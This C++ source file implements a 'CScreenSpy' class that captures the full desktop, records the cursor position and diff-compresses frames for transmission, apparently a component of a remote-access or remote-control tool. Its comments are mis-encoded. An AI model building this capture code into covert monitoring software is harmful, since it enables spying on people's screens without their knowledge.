#include "stdafx.h"
#include "ScreenSpy.h"


CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	//��Դ����ֱ�Ӹ��Ƶ�Ŀ�����
	m_dwBitBltRop = SRCCOPY;
	m_BitmapInfor_Full = NULL;
	switch (ulbiBitCount)
	{
	case 16:
	case 32:
	{
		m_ulbiBitCount = ulbiBitCount;
	}
	default:
		break;
	}
	//��õ�ǰ���ڵľ��
	m_DeskTopWndHandle = GetDesktopWindow();
	//��õ�ǰ�����豸
	m_hFullDC = GetDC(m_DeskTopWndHandle);
	//����һ����m_hFullDC���Ӧ�ĵ�λ�����豸������
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);

	//�����Ļ�ֱ���
	m_ulFullWidth = ::GetSystemMetrics(SM_CXSCREEN);    //��Ļ�ķֱ���
	m_ulFullHeight = ::GetSystemMetrics(SM_CYSCREEN);
	//����bitmap ��Ϣ
	m_BitmapInfor_Full = ConstructBI(m_ulbiBitCount, m_ulFullWidth, m_ulFullHeight);

	m_BitmapData_Full = NULL;
	//����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ��DIB���ĺ�����
	m_BitmapHandle = ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full,
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];
	m_RectBufferOffset = 0;
	m_hDiffMemDC = CreateCompatibleDC(m_hFullDC);
	m_DiffBitmapHandle = ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full,
		DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);
}


CScreenSpy::~CScreenSpy()
{
	//ReleaseDC(m_DeskTopWndHandle, m_hFullDC);   //GetDC
	if (m_hFullMemDC != NULL)
	{
		DeleteDC(m_hFullMemDC);                //Createƥ���ڴ�DC

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full != NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;

	}

	if (m_hDiffMemDC != NULL)
	{
		DeleteDC(m_hDiffMemDC);                //Createƥ���ڴ�DC

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full != NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}


	if (m_BitmapInfor_Full != NULL)
	{
		delete[] m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}

LPBITMAPINFO CScreenSpy::ConstructBI(ULONG ulBitCount, ULONG ulFullWidth, ULONG ulFullHeight)
{
	int ColorNum = ulBitCount <= 8 ? 1 << ulBitCount : 0;

	ULONG ulBitmapLength = sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
	BITMAPINFO* BitmapInfor = (BITMAPINFO*)new BYTE[ulBitmapLength];

	BITMAPINFOHEADER* BitmapInforHeader = &(BitmapInfor->bmiHeader);

	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);//pi si 
	BitmapInforHeader->biWidth = ulFullWidth; //1080
	BitmapInforHeader->biHeight = ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;  //��������Ϊ1
	BitmapInforHeader->biBitCount = ulBitCount; //16
	BitmapInforHeader->biCompression = BI_RGB;   //δ����ѹ����RGB
	BitmapInforHeader->biXPelsPerMeter = 0;
	BitmapInforHeader->biYPelsPerMeter = 0;
	BitmapInforHeader->biClrUsed = 0;
	BitmapInforHeader->biClrImportant = 0;
	BitmapInforHeader->biSizeImage =
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31) / 32) 
		* 4 * BitmapInforHeader->biHeight;

	return BitmapInfor;
}

ULONG CScreenSpy::GetBISize()
{
	ULONG ColorNum = m_ulbiBitCount < 8 ? 1 << m_ulbiBitCount : 0;
	return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
}
LPBITMAPINFO CScreenSpy::GetBIData()
{
	return m_BitmapInfor_Full;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
	::BitBlt(m_hFullMemDC, 0, 0,
		m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_BitmapData_Full;
}

ULONG CScreenSpy::GetFirstScreenLength()
{
	return m_BitmapInfor_Full->bmiHeader.biSizeImage;
}

LPVOID CScreenSpy::GetNextScreenData(ULONG * ulNextSendLength)
{
	if (ulNextSendLength == 0 || m_RectBuffer == NULL)
	{
		return NULL;
	}
	// ����rect������ָ��
	m_RectBufferOffset = 0;

	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	BYTE bCursorIndex = m_CursorInfor.GetCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ  ���µ�λͼ���뵽m_hDiffMemDC��
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth,
			m_BitmapInfor_Full->bmiHeader.biHeight);
		//����Bit���бȽ������һ���޸�m_lpvFullBits�еķ���
		*ulNextSendLength = m_RectBufferOffset +
			CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full,
				m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);
		return m_RectBuffer;
	}
	return NULL;
}

VOID CScreenSpy::WriteRectBuffer(LPBYTE szBuffer, ULONG ulLength)
{
	memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);
	m_RectBufferOffset += ulLength;
}

VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
	ULONG ulJumpLine = 50;
	ULONG ulJumpSleep = ulJumpLine / 10;
	int ulToJump = 0;
	for (int i = 0; i < ulHeight;i += ulToJump)
	{
		ULONG ulV1 = ulHeight - i;
		if (ulV1 > ulJumpLine)
		{
			ulToJump = ulJumpLine;
		}
		else
		{
			ulToJump = ulV1;
		}
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour, 0, i, m_dwBitBltRop);
		Sleep(ulJumpSleep);
	}
}

ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
	LPBYTE szBuffer, DWORD ulCompareLength)
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD p1, p2;
	p1 = (LPDWORD)CompareDestData;
	p2 = (LPDWORD)CompareSourData;

	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0;
	ULONG ulCount = 0;
	for (int i = 0; i < ulCompareLength;i +=4,p1++,p2++)
	{
		if (*p1 == *p2)
		{
			continue;
		}
		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;
		ulv1 = ulszBufferOffset + sizeof(int);
		ulv2 = ulv1 + sizeof(int);
		ulCount = 0;
		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		ulCount += 4;
		i += 4, p1++, p2++;
		for (int j = 0; j < ulCompareLength;i += 4,j += 4,p1++,p2++)
		{
			if (*p1 == *p2)
			{
				break;
			}
			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;
	}
	return ulszBufferOffset;
}
